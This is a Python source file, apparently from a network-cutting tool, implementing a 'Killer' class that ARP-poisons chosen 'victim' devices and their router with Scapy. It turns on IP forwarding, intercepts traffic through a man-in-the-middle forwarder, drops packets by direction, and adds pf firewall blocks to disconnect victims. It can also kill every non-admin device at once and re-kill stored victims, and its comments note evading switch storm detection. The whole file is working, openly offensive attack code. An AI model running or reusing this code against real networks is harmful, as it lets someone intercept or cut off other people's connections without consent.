from scapy.all import ARP, Ether, conf
from time import sleep
import sys
import subprocess

from networking.forwarder import MitmForwarder
from tools.pfctl import ensure_pf_enabled, install_anchor, block_all_for, unblock_all_for
from tools.utils import threaded, get_default_iface
from constants import *


def enable_ip_forwarding():
    """Enable kernel-level IP forwarding for fast packet forwarding."""
    try:
        if sys.platform == 'darwin':
            # macOS
            subprocess.run(['sysctl', '-w', 'net.inet.ip.forwarding=1'], 
                         capture_output=True, check=False)
        elif sys.platform.startswith('linux'):
            # Linux
            subprocess.run(['sysctl', '-w', 'net.ipv4.ip_forward=1'],
                         capture_output=True, check=False)
        # Windows: IP forwarding requires registry changes, skip for now
    except Exception:
        pass


class Killer:
    def __init__(self, router=DUMMY_ROUTER):
        self.iface = get_default_iface()
        # Use guid (Scapy/pcap name) for conf.iface, not friendly name
        conf.iface = self.iface.guid if self.iface.guid else self.iface.name
        # Enable kernel IP forwarding for fast MITM
        enable_ip_forwarding()
        self.router = router
        self.killed = {}
        self.storage = {}
        self.forwarders = {}
        self.pf_blocks = set()
        self._socket = None  # Persistent L2 socket
        self._op_seq = {}  # MAC -> operation generation to cancel stale workers

    def _next_op_seq(self, mac):
        seq = int(self._op_seq.get(mac, 0)) + 1
        self._op_seq[mac] = seq
        return seq
    
    def _get_socket(self):
        """Get or create persistent L2 socket - prevents Windows socket exhaustion"""
        if self._socket is None:
            try:
                iface = self.iface.guid if hasattr(self.iface, 'guid') and self.iface.guid else self.iface.name
                self._socket = conf.L2socket(iface=iface)
            except Exception:
                self._socket = None
        return self._socket
    
    def _send_packet(self, packet):
        """Send packet using persistent socket, fallback to new socket if needed"""
        sock = self._get_socket()
        if sock:
            try:
                sock.send(packet)
                return
            except Exception:
                # Socket died, recreate
                self._close_socket()
        
        # Fallback: direct send (creates new socket)
        try:
            from scapy.all import sendp
            iface = self.iface.guid if hasattr(self.iface, 'guid') and self.iface.guid else self.iface.name
            sendp(packet, iface=iface, verbose=0)
        except Exception:
            pass
    
    def _close_socket(self):
        """Close persistent socket"""
        if self._socket:
            try:
                self._socket.close()
            except Exception:
                pass
            self._socket = None
    
    def kill(self, victim, wait_after=2):
        """
        Spoofing victim.
        Default 2 second delay - ARP cache lasts 30-120s, no need to spam.
        Prevents Windows NDIS throttling.

        Registers ``self.killed`` on the caller thread so UI state (e.g. toggleKill)
        stays in sync; only the ARP loop runs in a background thread.
        """
        if victim['mac'] in self.killed:
            return
        seq = self._next_op_seq(victim['mac'])
        self.killed[victim['mac']] = victim
        self._stop_forwarder(victim['mac'])
        self._kill_arp_worker(victim, wait_after, seq)

    def start_directional_drop(self, victim, direction='both', debug=False):
        """
        Start user-space forwarding with directional packet drops.
        Useful fallback when pf/firewall rules are unavailable.
        """
        if victim['mac'] not in self.killed:
            self.kill(victim)
        if victim['mac'] in self.forwarders:
            self.forwarders[victim['mac']].stop()
        if not self.router.get('mac'):
            return False
        iface_to_use = self.iface.guid if hasattr(self.iface, 'guid') and self.iface.guid else self.iface.name
        if not iface_to_use or iface_to_use == 'NULL':
            return False
        drop_from_victim = direction in ('both', 'out')
        drop_to_victim = direction in ('both', 'in')
        fw = MitmForwarder(debug=debug)
        fw.start(
            victim=victim,
            router=self.router,
            iface_name=iface_to_use,
            iface_mac=self.iface.mac,
            drop_from_victim=drop_from_victim,
            drop_to_victim=drop_to_victim,
        )
        self.forwarders[victim['mac']] = fw
        return True

    def stop_directional_drop(self, mac):
        self._stop_forwarder(mac)

    @threaded
    def _kill_arp_worker(self, victim, wait_after=2, seq=0):
        # Send ARP reply (is-at) with proper Ethernet destination to poison caches
        # Unicast to specific MAC, not broadcast - avoids switch storm detection

        # Victim: tell victim that router IP is at our MAC
        to_victim = Ether(dst=victim['mac'])/ARP(
            op=2,
            psrc=self.router['ip'],
            hwsrc=self.iface.mac,
            pdst=victim['ip'],
            hwdst=victim['mac']
        )

        # Router: tell router that victim IP is at our MAC
        to_router = Ether(dst=self.router['mac'])/ARP(
            op=2,
            psrc=victim['ip'],
            hwsrc=self.iface.mac,
            pdst=self.router['ip'],
            hwdst=self.router['mac']
        )

        while (
            victim['mac'] in self.killed
            and self.iface.name != 'NULL'
            and self._op_seq.get(victim['mac']) == seq
        ):
            # Send packets using persistent socket
            self._send_packet(to_victim)
            self._send_packet(to_router)
            # Sleep in short slices so OFF takes effect quickly (avoid UI/backend desync feel).
            total_wait = max(0.05, float(wait_after))
            slept = 0.0
            step = 0.05
            while slept < total_wait:
                if (
                    victim['mac'] not in self.killed
                    or self.iface.name == 'NULL'
                    or self._op_seq.get(victim['mac']) != seq
                ):
                    break
                sleep(step)
                slept += step

        if victim['mac'] not in self.killed:
            self._stop_forwarder(victim['mac'])

    def unkill(self, victim):
        """
        Unspoofing victim.

        Removes from ``self.killed`` on the caller thread before ARP restore runs
        in the background, so the UI does not race with _sync_killed_devices().
        """
        seq = self._next_op_seq(victim['mac'])
        if victim['mac'] in self.killed:
            self.killed.pop(victim['mac'])
        # Strong immediate restore burst so OFF reflects on network quickly.
        self._restore_arp_now(victim, seq, repeats=3, delay_s=0.05)
        self._unkill_restore_worker(victim, seq)

    def reinforce_restore(self, victim):
        """
        Extra best-effort restore packets for a victim that should already be OFF.
        Safe no-op when victim is currently killed again.
        """
        mac = victim.get('mac') if isinstance(victim, dict) else None
        if not mac:
            return
        if mac in self.killed:
            return
        seq = self._op_seq.get(mac, 0)
        self._restore_arp_now(victim, seq, repeats=2, delay_s=0.05)

    def _restore_arp_now(self, victim, seq=0, repeats=1, delay_s=0.1):
        """Best-effort ARP restore; aborts if a newer op supersedes this sequence."""
        to_victim = Ether(dst=victim['mac'])/ARP(
            op=2,
            psrc=self.router['ip'],
            hwsrc=self.router['mac'],
            pdst=victim['ip'],
            hwdst=victim['mac']
        )

        to_router = Ether(dst=self.router['mac'])/ARP(
            op=2,
            psrc=victim['ip'],
            hwsrc=victim['mac'],
            pdst=self.router['ip'],
            hwdst=self.router['mac']
        )

        if self.iface.name == 'NULL':
            return
        for _ in range(max(1, int(repeats))):
            if self._op_seq.get(victim['mac']) != seq or victim['mac'] in self.killed:
                break
            self._send_packet(to_victim)
            self._send_packet(to_router)
            if delay_s > 0:
                sleep(delay_s)

    @threaded
    def _unkill_restore_worker(self, victim, seq=0):
        # Follow-up restore bursts to reinforce cache correction.
        self._restore_arp_now(victim, seq, repeats=3, delay_s=0.1)
        if self._op_seq.get(victim['mac']) == seq and victim['mac'] not in self.killed:
            self._stop_forwarder(victim['mac'])
            self._remove_pf_block(victim['ip'])

    def kill_all(self, device_list):
        """
        Safely kill all devices
        """
        for device in device_list[:]:
            if device['admin']:
                continue
            if device['mac'] not in self.killed:
                self.kill(device)

    def unkill_all(self):
        """
        Safely unkill all devices killed previously
        """
        victims = list(self.killed.values())
        for victim in victims:
            mac = victim['mac']
            seq = self._next_op_seq(mac)
            self.killed.pop(mac, None)
            # Immediate restore burst for OFF parity with per-device unkill.
            self._restore_arp_now(victim, seq, repeats=3, delay_s=0.05)
            self._unkill_restore_worker(victim, seq)
            self._stop_forwarder(mac)
        for ip in list(self.pf_blocks):
            self._remove_pf_block(ip)
        # Close persistent socket when done
        self._close_socket()
    
    def store(self):
        """
        Save a copy of previously killed devices
        """
        self.storage = dict(self.killed)
    
    def release(self):
        """
        Remove the stored copy of killed devices
        """
        self.storage = {}
    
    def rekill_stored(self, new_devices):
        """
        Re-kill old devices in self.storage
        """
        for mac, old in self.storage.items():
            for new in new_devices:
                # Update old killed with newer ip
                if old['mac'] == new['mac']:
                    old['ip'] = new['ip']
                    break
                
            # Update new_devices with those it does not have
            if old not in new_devices:
                new_devices.append(old)

            self.kill(old)

    def one_way_kill(self, victim):
        """
        Kill victim and block their outbound traffic.
        Uses kernel IP forwarding + pf block (fast, no Python overhead).
        
        With sysctl net.inet.ip.forwarding=1:
        - ARP spoof redirects traffic through us
        - Kernel forwards packets at native speed
        - pf blocks outbound from victim (kernel level, instant)
        """
        # Ensure victim is being ARP poisoned
        if victim['mac'] not in self.killed:
            self.kill(victim)
            # Wait for poison to start
            for _ in range(10):
                sleep(0.1)
                if victim['mac'] in self.killed:
                    break
        
        # Block outbound at kernel level with pf (no slow Python forwarder)
        self._enforce_pf_block(victim['ip'])

    def _start_one_way_forwarder(self, victim, debug=False):
        if victim['mac'] in self.forwarders:
            self.forwarders[victim['mac']].stop()
        if not self.router.get('mac'):
            if debug:
                print(f"[killer] Cannot start forwarder: router MAC unknown")
            return
        iface_to_use = self.iface.guid if hasattr(self.iface, 'guid') and self.iface.guid else self.iface.name
        if not iface_to_use or iface_to_use == 'NULL':
            if debug:
                print(f"[killer] Cannot start forwarder: invalid interface")
            return
        fw = MitmForwarder(debug=debug)
        fw.start(
            victim=victim,
            router=self.router,
            iface_name=iface_to_use,
            iface_mac=self.iface.mac,
            drop_from_victim=True,
            drop_to_victim=False,
        )
        self.forwarders[victim['mac']] = fw
        if debug:
            print(f"[killer] Forwarder started for {victim['ip']}")
    
    def get_forwarder_stats(self, mac):
        """Get stats for a specific forwarder"""
        fw = self.forwarders.get(mac)
        if fw:
            return fw.get_stats()
        return None

    def _stop_forwarder(self, mac):
        fw = self.forwarders.pop(mac, None)
        if fw:
            fw.stop()

    def _enforce_pf_block(self, victim_ip: str):
        if victim_ip in self.pf_blocks:
            return
        if ensure_pf_enabled() and install_anchor():
            if block_all_for(self.iface.name, victim_ip):
                self.pf_blocks.add(victim_ip)

    def _remove_pf_block(self, victim_ip: str):
        if victim_ip not in self.pf_blocks:
            return
        if ensure_pf_enabled() and install_anchor():
            unblock_all_for(victim_ip)
        self.pf_blocks.discard(victim_ip)
